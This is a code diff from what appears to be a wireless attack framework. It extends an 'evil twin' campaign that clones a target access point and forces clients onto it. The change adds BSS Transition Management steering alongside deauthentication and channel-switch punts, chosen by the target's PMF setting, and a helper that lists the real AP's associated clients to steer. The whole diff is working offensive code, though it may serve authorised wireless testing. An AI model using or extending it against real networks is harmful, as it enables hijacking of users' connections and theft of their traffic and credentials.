@@ -31,15 +31,12 @@ def csa_target_channel(ap_channel: int, preferred: Optional[int] = None) -> int:
     return 6 if ap_channel == 1 else 1
 
 
-def default_punt_mode(ap) -> PuntMode:
-    """The punt mode for a target's PMF posture (EVILTWIN.md §5): PMF-Required clients ignore
-    deauth so only CSA herds them; PMF-Disabled take a plain deauth; Optional gets both (the
-    protected and unprotected client populations are disjoint)."""
+def default_punt_modes(ap) -> tuple[PuntMode, ...]:
+    """Techniques checked by default for the target's PMF posture: PMF-Required blocks the
+    robust-frame punts (deauth + BTM), leaving CSA; otherwise all three."""
     if ap.pmf_required:
-        return PuntMode.CSA
-    if ap.pmf_capable:
-        return PuntMode.BOTH
-    return PuntMode.DEAUTH
+        return (PuntMode.CSA,)
+    return (PuntMode.DEAUTH, PuntMode.CSA, PuntMode.BTM)
 
 
 @dataclass(frozen=True)
@@ -49,7 +46,7 @@ class EvilTwinInput:
     punt_iface: object                       # may equal twin_iface (single-card)
     twin_channel: int
     twin_bssid: str                          # the twin's BSSID; equal to the target's spoofs it
-    punt_mode: PuntMode = PuntMode.BOTH
+    punt_modes: tuple[PuntMode, ...] = ()    # enabled eviction techniques; empty = host only
     csa_channel: Optional[int] = None        # None resolves off the twin channel (see _make_punter)
     punt_period_sec: Optional[float] = 30.0  # None never punts (host only)
     punt_once: bool = False
@@ -96,10 +93,11 @@ class EvilTwinCampaign(Campaign):
         self.captured = False
 
     def _make_punter(self, evil_input: EvilTwinInput, target_bssid: str) -> Optional[Punter]:
-        if evil_input.punt_mode is PuntMode.NONE:
+        if not evil_input.punt_modes:
             return None
         csa_channel = csa_target_channel(self.target_channel, evil_input.csa_channel or self.twin_channel)
-        return Punter(evil_input.punt_mode, self.real_beacon, str_to_mac(target_bssid), csa_channel)
+        return Punter(evil_input.punt_modes, self.real_beacon, str_to_mac(target_bssid), csa_channel,
+                      str_to_mac(self.twin_bssid), self.twin_channel)
 
     async def _loop(self) -> None:
         self.fakeap = FakeAP(self.twin_iface, str_to_mac(self.twin_bssid), self.ssid,
@@ -120,9 +118,15 @@ class EvilTwinCampaign(Campaign):
                 self.captured = True
                 break
             if self._should_punt(punted):
-                await self.punter.punt(self.punt_iface)
+                await self.punter.punt(self.punt_iface, self._target_clients())
                 punted = True
             await self._sleep_between_bursts(self.punt_period_sec or _POLL_SEC)
+
+    def _target_clients(self) -> list[bytes]:
+        """MACs associated to the real target AP: the STAs a BTM punt steers to the twin."""
+        target = self.ap.bssid.lower()
+        return [str_to_mac(c.mac) for c in self.array.clients.values()
+                if not c.is_self and (c.bssid or "").lower() == target]
 
     def _should_punt(self, already_punted: bool) -> bool:
         if self.punter is None or self.punt_period_sec is None:
